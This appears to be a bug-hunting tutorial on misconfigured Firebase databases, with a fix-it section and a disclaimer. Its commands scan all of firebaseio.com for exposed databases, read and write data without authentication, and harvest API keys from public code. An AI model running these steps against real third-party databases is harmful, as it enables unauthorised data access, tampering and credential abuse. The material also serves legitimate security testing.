# 🔥 Firebase Hacking & PoC Testing

## 🚀 Introduction

Firebase is a cloud-based platform that provides backend services such as databases, authentication, and storage for web and mobile applications. However, misconfigured Firebase databases can lead to serious security vulnerabilities, allowing unauthorized users to read and write data. This guide will walk you through the process of identifying and testing Firebase vulnerabilities step by step.

---

## 🕵️‍♂️ Step 1: Finding Firebase Subdomains

First, find subdomains associated with Firebase under `*.firebaseio.com`. You can use tools like:

- Subfinder
- Amass
- Assetfinder
- FOFA, Shodan, ZoomEye (search engines)

Example queries:

```
FOFA Query: "domain=firebaseio.com"
Shodan Query: "http.title:Firebase"
ZoomEye Query: "site:firebaseio.com"
```

### 🔍 Automated Command to Find Live and Accessible Firebase Subdomains

```bash
subfinder -d firebaseio.com | httpx -mc 200 -silent | xargs -I {} curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" {}/.json | grep "200"
```

This command will:
1. Find Firebase subdomains using `subfinder`.
2. Filter only live subdomains responding with HTTP `200` using `httpx`.
3. Check if the Firebase database is accessible by sending a `GET` request to `/.json`.
4. Print only the domains that return `200 OK`.

---

## 🛠 Step 2: Testing if Firebase is Accessible

Once you have a subdomain, check if it's publicly accessible by sending a GET request using `curl`:

```bash
curl -X GET https://<subdomain>.firebaseio.com/.json -H "Content-Type: application/json" -i
```

If the response includes `200 OK` and returns JSON data, the Firebase database is misconfigured and allows public read access.

---

## ✍️ Step 3: Testing for Unauthenticated Write Access

Try sending a write request to check if the Firebase database allows unauthenticated write access:

```bash
curl -X POST https://<subdomain>.firebaseio.com/.json \
     -d '{"test":"subhashis_exploit_poc"}' \
     -H "Content-Type: application/json"
```

If the request is successful and data is written, the Firebase database is vulnerable to **unauthenticated write access**.

---

## 🔑 Step 4: Finding Firebase API Keys

Another method to test Firebase security is by searching for Firebase API keys. You can look for keys in:

- Public GitHub repositories (`AIzaSy` pattern)
- JavaScript files of web applications
- Mobile application decompilation

Example Firebase API key: `AIzaSyDluKZPdsuwxICZvjKi43I7KLLgAHGtxxx`

### 🔍 Testing API Key for Authentication

Use a token generator like [subhashis360.github.io/idtokengenarate](https://subhashis360.github.io/idtokengenarate):

1. Paste the API key.
2. Click **Sign Up**.
3. If you receive a valid token, the API key is vulnerable.

---

## 🔒 How to Fix It

### ✅ Secure Firebase Database:

1. Open Firebase Console.
2. Navigate to **Database > Rules**.
3. Update the rules to restrict access only to authenticated users:

```json
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}
```

### 🔍 Audit Subdomains:

- Ensure no publicly accessible Firebase databases exist.
- Check for outdated or unused Firebase projects.

### 📊 Monitor Activity Logs:

- Use Firebase’s built-in logging to monitor access and detect unusual activity.
- Enable **Cloud Logging** and **Cloud Monitoring** to track API requests.

---

## 🛑 Disclaimer

This guide is for **educational purposes only**. Unauthorized access to Firebase databases without permission is illegal and may result in severe consequences. Always obtain proper authorization before performing security tests.

---

## 🤝 Conclusion

Misconfigured Firebase databases pose serious security risks. By following the steps above, you can identify vulnerabilities and take corrective actions to secure Firebase applications. Happy hacking responsibly! 🛡
